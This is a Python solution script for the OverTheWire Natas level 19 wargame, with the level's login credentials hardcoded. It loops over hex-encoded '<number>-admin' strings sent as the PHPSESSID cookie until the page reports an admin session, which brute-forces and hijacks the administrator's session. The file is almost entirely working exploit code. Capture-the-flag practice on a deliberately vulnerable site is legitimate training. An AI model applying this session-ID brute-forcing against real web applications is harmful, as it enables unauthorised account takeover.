#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string

username = 'natas19'
password = '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s'

url = 'http://%s.natas.labs.overthewire.org/' % username

for i in range(641):

    session = requests.Session()
    
    hex_encoded_session_id = "%d-admin" % i
    print("Trying PHPSESSID:", hex_encoded_session_id.encode('utf-8').hex())

    cookies = {"PHPSESSID": hex_encoded_session_id.encode('utf-8').hex()}
    response = session.get(url, cookies=cookies, auth=(username, password))

    #response = session.get(url, auth=(username, password))
    #response = session.get(url, cookies = {"PHPSESSID" : str("%d-admin" % i).encode('hex')}, auth = (username, password))
    #response = session.post(url, data = {"username": "shenal", "password" : "mario"}, auth = (username, password))
    content = response.text

    if "You are an admin" in content :
        print("Got it!!", i)
        print(content)
        break
        
    


    #print(session.cookies["PHPSESSID"].decode('hex'))
    #print(bytes.fromhex(session.cookies["PHPSESSID"]).decode('utf-8'))
    
